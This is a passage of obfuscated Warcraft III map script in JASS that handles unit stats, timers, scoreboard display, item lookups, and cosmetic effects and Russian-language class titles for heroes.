call SetTextTagPermanent(No,false)
call SetTextTagSuspended(No,false)
set No=null
endif
call SetUnitState(Ne,UNIT_STATE_LIFE,RMaxBJ(0,GetUnitState(Ne,UNIT_STATE_LIFE)+L9))
endfunction
function m3 takes unit Ne,integer L9 returns nothing
call SetUnitState(Ne,UNIT_STATE_MANA,RMaxBJ(0,GetUnitState(Ne,UNIT_STATE_MANA)+L9))
endfunction
function m4 takes nothing returns nothing
local unit Hu=GetEnumUnit()
call m2(Hu,Nu)
set Hu=null
endfunction
function m5 takes nothing returns nothing
local unit Hu=GetEnumUnit()
call m3(Hu,Nu)
set Hu=null
endfunction
function m6 takes unit Ne,unit Hu,integer L9 returns nothing
call UnitDamageTarget(Ne,Hu,L9,true,false,ATTACK_TYPE_NORMAL,DAMAGE_TYPE_UNIVERSAL,WEAPON_TYPE_WHOKNOWS)
endfunction
function m7 takes nothing returns nothing
local unit Nv=GetEnumUnit()
call m6(Pq,Nv,Nu)
set Nv=null
endfunction
function m8 takes nothing returns nothing
local unit Nv=GetEnumUnit()
call m0(Pq,Nv,Nu)
set Nv=null
endfunction
function m9 takes nothing returns nothing
local unit Nv=GetEnumUnit()
call m1(Pq,Nv,Nu)
set Nv=null
endfunction
function nB takes nothing returns nothing
local unit Nv=GetEnumUnit()
call mz(Pq,Nv,Nu)
set Nv=null
endfunction
function nC takes nothing returns nothing
call KillUnit(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),10))
call RemoveUnit(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),10))
set Ps[GetPlayerId(GetOwningPlayer(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),10)))]=0
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),10)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function nD takes unit Hu,real L9 returns nothing
local timer Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),10,Hu)
call TimerStart(Hc,L9,false,function nC)
set Hc=null
endfunction
function nE takes nothing returns nothing
local unit Hu=LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),0)
local integer UX
local integer L9
local integer UV
local integer UY
local integer Pd
local integer UW
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(GetExpiredTimer()),1))
set UX=10000*GetUnitAbilityLevel(Hu,$41304456)+1000*GetUnitAbilityLevel(Hu,$4131394B)+100*GetUnitAbilityLevel(Hu,$4131394A)+10*GetUnitAbilityLevel(Hu,$41313949)+GetUnitAbilityLevel(Hu,$41305545)
set L9=LoadInteger(PP,GetHandleId(GetExpiredTimer()),2)
call UnitRemoveAbility(Hu,$4131394B)
call UnitRemoveAbility(Hu,$4131394A)
call UnitRemoveAbility(Hu,$41313949)
call UnitRemoveAbility(Hu,$41305545)
call UnitRemoveAbility(Hu,$41304456)
call UnitRemoveAbility(Hu,$41313757)
set UV=UX-L9
if UV>0 then
loop
if UV>=10000 then
call UnitAddAbility(Hu,$41304456)
call SetUnitAbilityLevel(Hu,$41304456,UV/10000)
set UV=UV-10000*GetUnitAbilityLevel(Hu,$41304456)
else
if UV>=1000 then
call UnitAddAbility(Hu,$4131394B)
call SetUnitAbilityLevel(Hu,$4131394B,UV/1000)
set UV=UV-1000*GetUnitAbilityLevel(Hu,$4131394B)
else
if UV>=100 then
call UnitAddAbility(Hu,$4131394A)
call SetUnitAbilityLevel(Hu,$4131394A,UV/100)
set UV=UV-100*GetUnitAbilityLevel(Hu,$4131394A)
else
if UV>=10 then
call UnitAddAbility(Hu,$41313949)
call SetUnitAbilityLevel(Hu,$41313949,UV/10)
set UV=UV-10*GetUnitAbilityLevel(Hu,$41313949)
else
if UV>=1 then
call UnitAddAbility(Hu,$41305545)
call SetUnitAbilityLevel(Hu,$41305545,UV/1)
set UV=UV-1*GetUnitAbilityLevel(Hu,$41305545)
endif
endif
endif
endif
endif
exitwhen UV==0
endloop
endif
set UY=1000*GetUnitAbilityLevel(Hu,$4131345A)+100*GetUnitAbilityLevel(Hu,$4131394F)+10*GetUnitAbilityLevel(Hu,$4131394E)+1*GetUnitAbilityLevel(Hu,$4131394D)
set Pd=LoadInteger(PP,GetHandleId(GetExpiredTimer()),3)
call UnitRemoveAbility(Hu,$4131394F)
call UnitRemoveAbility(Hu,$4131394E)
call UnitRemoveAbility(Hu,$4131394D)
call UnitRemoveAbility(Hu,$4131345A)
set UW=UY-Pd
if UW>0 then
loop
if UW>=1000 then
call UnitAddAbility(Hu,$4131345A)
call SetUnitAbilityLevel(Hu,$4131345A,UW/1000)
set UW=UW-1000*GetUnitAbilityLevel(Hu,$4131345A)
else
if UW>=100 then
call UnitAddAbility(Hu,$4131394F)
call SetUnitAbilityLevel(Hu,$4131394F,UW/100)
set UW=UW-100*GetUnitAbilityLevel(Hu,$4131394F)
else
if UW>=10 then
call UnitAddAbility(Hu,$4131394E)
call SetUnitAbilityLevel(Hu,$4131394E,UW/10)
set UW=UW-10*GetUnitAbilityLevel(Hu,$4131394E)
else
if UW>=1 then
call UnitAddAbility(Hu,$4131394D)
call SetUnitAbilityLevel(Hu,$4131394D,UW/1)
set UW=UW-1*GetUnitAbilityLevel(Hu,$4131394D)
endif
endif
endif
endif
exitwhen UW==0
endloop
endif
call FlushChildHashtable(PP,GetHandleId(GetExpiredTimer()))
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),3)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
set Hu=null
endfunction
function nF takes integer ig,integer ih,string ii returns multiboard
local multiboard PS=CreateMultiboard()
call MultiboardSetRowCount(PS,ih)
call MultiboardSetColumnCount(PS,ig)
call MultiboardSetTitleText(PS,ii)
call MultiboardDisplay(PS,true)
set ij=PS
set PS=null
return ij
endfunction
function nG takes multiboard PS,integer PT,integer PU,real ik returns nothing
local integer PY=0
local integer PZ=0
local integer PW=MultiboardGetRowCount(PS)
local integer PX=MultiboardGetColumnCount(PS)
local multiboarditem Pa
loop
set PY=PY+1
exitwhen PY>PW
if PU==0 or PU==PY then
set PZ=0
loop
set PZ=PZ+1
exitwhen PZ>PX
if PT==0 or PT==PZ then
set Pa=MultiboardGetItem(PS,PY-1,PZ-1)
call MultiboardSetItemWidth(Pa,ik/100.)
call MultiboardReleaseItem(Pa)
endif
endloop
endif
endloop
set Pa=null
endfunction
function nH takes multiboard PS,integer PT,integer PU,string il returns nothing
local integer PY=0
local integer PZ=0
local integer PW=MultiboardGetRowCount(PS)
local integer PX=MultiboardGetColumnCount(PS)
local multiboarditem Pa
loop
set PY=PY+1
exitwhen PY>PW
if PU==0 or PU==PY then
set PZ=0
loop
set PZ=PZ+1
exitwhen PZ>PX
if PT==0 or PT==PZ then
set Pa=MultiboardGetItem(PS,PY-1,PZ-1)
call MultiboardSetItemIcon(Pa,il)
call MultiboardReleaseItem(Pa)
endif
endloop
endif
endloop
set Pa=null
endfunction
function nI takes multiboard PS,integer PT,integer PU,boolean im,boolean in returns nothing
local integer PY=0
local integer PZ=0
local integer PW=MultiboardGetRowCount(PS)
local integer PX=MultiboardGetColumnCount(PS)
local multiboarditem Pa
loop
set PY=PY+1
exitwhen PY>PW
if PU==0 or PU==PY then
set PZ=0
loop
set PZ=PZ+1
exitwhen PZ>PX
if PT==0 or PT==PZ then
set Pa=MultiboardGetItem(PS,PY-1,PZ-1)
call MultiboardSetItemStyle(Pa,im,in)
call MultiboardReleaseItem(Pa)
endif
endloop
endif
endloop
set Pa=null
endfunction
function nJ takes multiboard PS,integer PT,integer PU,string PV returns nothing
local integer PY=0
local integer PZ=0
local integer PW=MultiboardGetRowCount(PS)
local integer PX=MultiboardGetColumnCount(PS)
local multiboarditem Pa
loop
set PY=PY+1
exitwhen PY>PW
if PU==0 or PU==PY then
set PZ=0
loop
set PZ=PZ+1
exitwhen PZ>PX
if PT==0 or PT==PZ then
set Pa=MultiboardGetItem(PS,PY-1,PZ-1)
call MultiboardSetItemValue(Pa,PV)
call MultiboardReleaseItem(Pa)
endif
endloop
endif
endloop
set Pa=null
endfunction
function nK takes real Pt,real Pu,real Pw,real Px returns real
return bj_RADTODEG*Atan2(Px-Pu,Pw-Pt)
endfunction
function nN takes unit N1,integer N2 returns integer
local integer N3
local item N4
set N3=0
loop
set N4=UnitItemInSlot(N1,N3)
if N4!=null and GetItemTypeId(N4)==N2 then
set N4=null
set N4=null
return N3+1
endif
set N3=N3+1
exitwhen N3>=bj_MAX_INVENTORY
endloop
set N4=null
return 0
endfunction
function nO takes unit N1,integer N2 returns boolean
return nN(N1,N2)>0
endfunction
function nP takes unit N1,integer N2 returns item
local integer N3=nN(N1,N2)
if N3==0 then
return null
else
return UnitItemInSlot(N1,N3-1)
endif
endfunction
function nQ takes integer N2,unit QG returns item
local location Ht=GetUnitLoc(QG)
local item L9=CreateItem(N2,GetLocationX(Ht),GetLocationY(Ht))
call UnitAddItem(QG,L9)
call RemoveLocation(Ht)
set Ht=null
set QH=L9
set L9=null
return QH
endfunction
function nR takes real NT returns real
local real Pv=GetRectMinX(bj_mapInitialPlayableArea)+50
if NT<Pv then
return Pv
endif
set Pv=GetRectMaxX(bj_mapInitialPlayableArea)-50
if NT>Pv then
return Pv
endif
return NT
endfunction
function nS takes real NT returns real
local real Pv=GetRectMinY(bj_mapInitialPlayableArea)+50
if NT<Pv then
return Pv
endif
set Pv=GetRectMaxY(bj_mapInitialPlayableArea)-50
if NT>Pv then
return Pv
endif
return NT
endfunction
function nT takes location Py,location Pz returns real
local real P0=GetLocationX(Pz)-GetLocationX(Py)
local real P1=GetLocationY(Pz)-GetLocationY(Py)
return SquareRoot(P0*P0+P1*P1)
endfunction
function nU takes location Vo,real Vp,real Vq returns location
local real MD=GetLocationX(Vo)+Vp*Cos(Vq*bj_DEGTORAD)
local real ME=GetLocationY(Vo)+Vp*Sin(Vq*bj_DEGTORAD)
return Location(MD,ME)
endfunction
function nV takes player Ht returns nothing
if GetLocalPlayer()==Ht then
call ClearTextMessages()
endif
endfunction
function nW takes unit Hu returns nothing
local player Ht=GetOwningPlayer(Hu)
local integer Ma=GetPlayerId(Ht)
local integer L9=GetUnitAbilityLevel(Hu,$41313247)+GetUnitAbilityLevel(Hu,$41314335)+GetUnitAbilityLevel(Hu,$41313234)+GetUnitAbilityLevel(Hu,$41313357)+GetUnitAbilityLevel(Hu,$41314341)+GetUnitAbilityLevel(Hu,$41314330)+GetUnitAbilityLevel(Hu,$41314332)
local string PO
if GetUnitAbilityLevel(Hu,$41313357)>=1 then
if L9>=5 and L9<10 then
set PO="war3mapImported\\BlackWingVR.mdl"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"chest"))
elseif L9>=10 and L9<15 then
set PO="war3mapImported\\TranquilityAuraRed.mdl"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"origin"))
elseif L9>=15 and L9<20 then
set PO="war3mapImported\\Chaos Wings.mdl"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"chest"))
elseif L9>=20 and L9<25 then
set PO="war3mapImported\\Windwalk Blood.mdx"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"origin"))
elseif L9>=25 and L9<30 then
set PO="war3mapImported\\307.mdx"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"chest"))
endif
elseif GetUnitAbilityLevel(Hu,$41314330)>=1 then
if L9>=5 and L9<10 then
set PO="war3mapImported\\YY.mdl"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"chest"))
elseif L9>=10 and L9<15 then
set PO="war3mapImported\\TranquilityAuraGreen+Yellow.mdl"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"origin"))
elseif L9>=15 and L9<20 then
set PO="war3mapImported\\Nature Wings.mdl"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"chest"))
elseif L9>=20 and L9<25 then
set PO="war3mapImported\\Windwalk Necro Soul.mdx"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"origin"))
elseif L9>=25 and L9<30 then
set PO="war3mapImported\\111.mdx"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"chest"))
endif
elseif GetUnitAbilityLevel(Hu,$41314332)>=1 then
if L9>=5 and L9<10 then
set PO="war3mapImported\\Phoenix Wing.mdl"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"chest"))
elseif L9>=10 and L9<15 then
set PO="war3mapImported\\TranquilityAuraYellow.mdl"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"origin"))
elseif L9>=15 and L9<20 then
set PO="war3mapImported\\Divine Wings.mdl"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"chest"))
elseif L9>=20 and L9<25 then
set PO="war3mapImported\\Windwalk Fire.mdx"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"origin"))
elseif L9>=25 and L9<30 then
set PO="war3mapImported\\scbmcyq.mdx"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"chest"))
endif
elseif GetUnitAbilityLevel(Hu,$41314341)>=1 then
if L9>=5 and L9<10 then
set PO="war3mapImported\\Purple Abyss Wing.mdl"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"chest"))
elseif L9>=10 and L9<15 then
set PO="war3mapImported\\TranquilityAuraBlue.mdl"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"origin"))
elseif L9>=15 and L9<20 then
set PO="war3mapImported\\Cosmic Wings.mdl"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"chest"))
elseif L9>=20 and L9<25 then
set PO="war3mapImported\\Windwalk.mdx"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"origin"))
elseif L9>=25 and L9<30 then
set PO="war3mapImported\\23143532.mdx"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"chest"))
endif
elseif GetUnitAbilityLevel(Hu,$41313234)>=1 then
if L9>=5 and L9<10 then
set PO="war3mapImported\\Another Divinity Attachment.mdl"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"chest"))
elseif L9>=10 and L9<15 then
set PO="war3mapImported\\TranquilityAuraGreen.mdl"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"origin"))
elseif L9>=15 and L9<20 then
set PO="war3mapImported\\Nature Wings.mdl"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"chest"))
elseif L9>=20 and L9<25 then
set PO="war3mapImported\\Windwalk Necro Soul.mdx"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"origin"))
elseif L9>=25 and L9<30 then
set PO="war3mapImported\\wing30.mdx"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"chest"))
endif
elseif GetUnitAbilityLevel(Hu,$41313247)>=1 then
if L9>=5 and L9<10 then
set PO="war3mapImported\\YH5.mdl"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"chest"))
elseif L9>=10 and L9<15 then
set PO="war3mapImported\\TranquilityAuraWhite.mdl"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"origin"))
elseif L9>=15 and L9<20 then
set PO="war3mapImported\\Chaos Wings.mdl"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"chest"))
elseif L9>=20 and L9<25 then
set PO="war3mapImported\\Windwalk Blood.mdx"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"origin"))
elseif L9>=25 and L9<30 then
set PO="war3mapImported\\02.mdx"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"chest"))
endif
elseif GetUnitAbilityLevel(Hu,$41314335)>=1 then
if L9>=5 and L9<10 then
set PO="war3mapImported\\DHYY.mdl"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"chest"))
elseif L9>=10 and L9<15 then
set PO="war3mapImported\\TranquilityAuraPurple.mdl"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"origin"))
elseif L9>=15 and L9<20 then
set PO="war3mapImported\\Void Wings.mdl"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"chest"))
elseif L9>=20 and L9<25 then
set PO="war3mapImported\\Windwalk Blue Soul.mdx"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"origin"))
elseif L9>=25 and L9<30 then
set PO="war3mapImported\\jd-chibian1.mdx"
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(Hu),0))
call RemoveSavedHandle(PP,GetHandleId(Hu),0)
call SaveEffectHandle(PP,GetHandleId(Hu),0,AddSpecialEffectTarget(PO,Hu,"chest"))
endif
endif
endfunction
function nX takes unit Hu,integer PL,integer PM,boolean PN returns nothing
local player Ht=GetOwningPlayer(Hu)
local integer Ma=GetPlayerId(Ht)
local string M6
local string PQ
call nW(Hu)
if PL==$41313357 then
call UnitAddAbility(MT[Ma],$41313357)
call UnitAddAbility(MT[Ma],$41304434)
call UnitAddAbility(MT[Ma],$41304D36)
call UnitAddAbility(MT[Ma],$41304836)
call UnitAddAbility(MT[Ma],$41304838)
elseif PL==$41314330 then
call UnitAddAbility(MT[Ma],$41314330)
call UnitAddAbility(MT[Ma],$41304D37)
call UnitAddAbility(MT[Ma],$41304D36)
call UnitAddAbility(MT[Ma],$41304836)
call UnitAddAbility(MT[Ma],$41304841)
call UnitAddAbility(MT[Ma],$41304737)
elseif PL==$41314332 then
call UnitAddAbility(MT[Ma],$41314332)
call UnitAddAbility(MT[Ma],$41304645)
call UnitAddAbility(MT[Ma],$41304D36)
call UnitAddAbility(MT[Ma],$41304836)
call UnitAddAbility(MT[Ma],$41304838)
call UnitAddAbility(MT[Ma],$41304739)
elseif PL==$41314341 then
call UnitAddAbility(MT[Ma],$41314341)
call UnitAddAbility(MT[Ma],$41304438)
call UnitAddAbility(MT[Ma],$41304D36)
call UnitAddAbility(MT[Ma],$41304739)
call UnitAddAbility(MT[Ma],$41304841)
elseif PL==$41313234 then
call UnitAddAbility(MT[Ma],$41313234)
call UnitAddAbility(MT[Ma],$41304549)
call UnitAddAbility(MT[Ma],$41304D36)
call UnitAddAbility(MT[Ma],$41304841)
call UnitAddAbility(MT[Ma],$41304739)
call UnitAddAbility(MT[Ma],$41304737)
elseif PL==$41313247 then
call UnitAddAbility(MT[Ma],$41313247)
call UnitAddAbility(MT[Ma],$41304557)
call UnitAddAbility(MT[Ma],$41304D36)
call UnitAddAbility(MT[Ma],$41304841)
call UnitAddAbility(MT[Ma],$41304737)
call UnitAddAbility(MT[Ma],$41304739)
elseif PL==$41314335 then
call UnitAddAbility(MT[Ma],$41314335)
call UnitAddAbility(MT[Ma],$53303039)
call UnitAddAbility(MT[Ma],$41304841)
call UnitAddAbility(MT[Ma],$41304836)
call UnitAddAbility(MT[Ma],$41304838)
endif
call SetUnitAbilityLevel(Hu,$41304434,PM)
call SetUnitAbilityLevel(Hu,$41313357,PM)
call SetUnitAbilityLevel(Hu,$41304D37,PM)
call SetUnitAbilityLevel(Hu,$41314330,PM)
call SetUnitAbilityLevel(Hu,$41304645,PM)
call SetUnitAbilityLevel(Hu,$41314332,PM)
call SetUnitAbilityLevel(Hu,$41304438,PM)
call SetUnitAbilityLevel(Hu,$41314341,PM)
call SetUnitAbilityLevel(Hu,$41304549,PM)
call SetUnitAbilityLevel(Hu,$41313234,PM)
call SetUnitAbilityLevel(Hu,$41304557,PM)
call SetUnitAbilityLevel(Hu,$41313247,PM)
call SetUnitAbilityLevel(Hu,$53303039,PM)
call SetUnitAbilityLevel(Hu,$41314335,PM)
call SetUnitAbilityLevel(Hu,$41304D36,PM)
call SetUnitAbilityLevel(Hu,$41304838,PM)
call SetUnitAbilityLevel(Hu,$41304841,PM)
call SetUnitAbilityLevel(Hu,$41304739,PM)
call SetUnitAbilityLevel(Hu,$41304836,PM)
call SetUnitAbilityLevel(Hu,$41304737,PM)
call SetPlayerAbilityAvailable(GetOwningPlayer(MT[Ma]),PL,false)
if PN==true then
call SetHeroStr(Hu,GetHeroStr(Hu,false)+17,false)
call SetHeroAgi(Hu,GetHeroAgi(Hu,false)+17,false)
call SetHeroInt(Hu,GetHeroInt(Hu,false)+17,false)
else
call SetHeroStr(Hu,GetHeroStr(Hu,false)+PM*17,false)
call SetHeroAgi(Hu,GetHeroAgi(Hu,false)+PM*17,false)
call SetHeroInt(Hu,GetHeroInt(Hu,false)+PM*17,false)
endif
if PM<=5 then
set M6="|c00FF80C0"
elseif PM>5 and PM<=10 then
set M6="|c008080C0"
elseif PM>10 and PM<=15 then
set M6="|c00ffff00"
elseif PM>15 and PM<=20 then
set M6="|cFF0080FF"
elseif PM>20 and PM<=25 then
set M6="|c00FF00FF"
elseif PM>25 and PM<=30 then
set M6="|c0000FF00"
endif
if GetUnitAbilityLevel(Hu,$41313357)>=1 then
set PQ=M6+"[Безумец]|r"+"("+I2S(PM)+"|r) "+OD[Ma]+OE[Ma]
set PR[Ma]=PQ
if GetUnitAbilityLevel(Hu,$41303944)>=1 then
call SetPlayerName(Player(Ma),PQ)
endif
call nJ(Pb,6,Ma+2,M6+"[Безумец]|r("+I2S(PM)+"|r) ")
elseif GetUnitAbilityLevel(Hu,$41314330)>=1 then
set PQ=M6+"[Авантюрист]|r"+"("+I2S(PM)+"|r) "+OD[Ma]+OE[Ma]
set PR[Ma]=PQ
if GetUnitAbilityLevel(Hu,$41303944)>=1 then
call SetPlayerName(Player(Ma),PQ)
endif
call nJ(Pb,6,Ma+2,M6+"[Авантюрист]|r("+I2S(PM)+"|r) ")
elseif GetUnitAbilityLevel(Hu,$41314332)>=1 then
set PQ=M6+"[Аристократ]|r"+"("+I2S(PM)+"|r) "+OD[Ma]+OE[Ma]
set PR[Ma]=PQ
if GetUnitAbilityLevel(Hu,$41303944)>=1 then
call SetPlayerName(Player(Ma),PQ)
endif
call nJ(Pb,6,Ma+2,M6+"[Аристократ]|r("+I2S(PM)+"|r) ")
elseif GetUnitAbilityLevel(Hu,$41314341)>=1 then
set PQ=M6+"[Бессмертный]|r"+"("+I2S(PM)+"|r) "+OD[Ma]+OE[Ma]
set PR[Ma]=PQ
if GetUnitAbilityLevel(Hu,$41303944)>=1 then
call SetPlayerName(Player(Ma),PQ)
endif
call nJ(Pb,6,Ma+2,M6+"[Бессмертный]|r("+I2S(PM)+"|r) ")
elseif GetUnitAbilityLevel(Hu,$41313234)>=1 then
set PQ=M6+"[Верующий]|r"+"("+I2S(PM)+"|r) "+OD[Ma]+OE[Ma]
set PR[Ma]=PQ
if GetUnitAbilityLevel(Hu,$41303944)>=1 then
call SetPlayerName(Player(Ma),PQ)
endif
call nJ(Pb,6,Ma+2,M6+"[Верующий]|r("+I2S(PM)+"|r) ")
elseif GetUnitAbilityLevel(Hu,$41313247)>=1 then
set PQ=M6+"[Грешник]|r"+"("+I2S(PM)+"|r) "+OD[Ma]+OE[Ma]
set PR[Ma]=PQ
if GetUnitAbilityLevel(Hu,$41303944)>=1 then
call SetPlayerName(Player(Ma),PQ)
endif
call nJ(Pb,6,Ma+2,M6+"[Грешник]|r("+I2S(PM)+"|r) ")
elseif GetUnitAbilityLevel(Hu,$41314335)>=1 then
set PQ=M6+"[Губитель]|r"+"("+I2S(PM)+"|r) "+OD[Ma]+OE[Ma]
set PR[Ma]=PQ
if GetUnitAbilityLevel(Hu,$41303944)>=1 then
call SetPlayerName(Player(Ma),PQ)
endif
call nJ(Pb,6,Ma+2,M6+"[Губитель]|r("+I2S(PM)+"|r) ")
endif
if OE[Ma]=="M.U.D.R.I.K" then
set PQ="|c0000ff00[Адский]|r "+OD[Ma]+OE[Ma]
set PR[Ma]=PQ
if GetUnitAbilityLevel(Hu,$41303944)>=1 then
call SetPlayerName(Player(Ma),PQ)
endif
elseif OE[Ma]=="1Natsu" then
set PQ="|c00ffff00[Архангел]|r "+OD[Ma]+OE[Ma]
set PR[Ma]=PQ
if GetUnitAbilityLevel(Hu,$41303944)>=1 then
call SetPlayerName(Player(Ma),PQ)
endif
elseif OE[Ma]=="Jeka_Pycckuu" then
set PQ="|c00fa0505[NoComments]|r "+OD[Ma]+OE[Ma]
set PR[Ma]=PQ
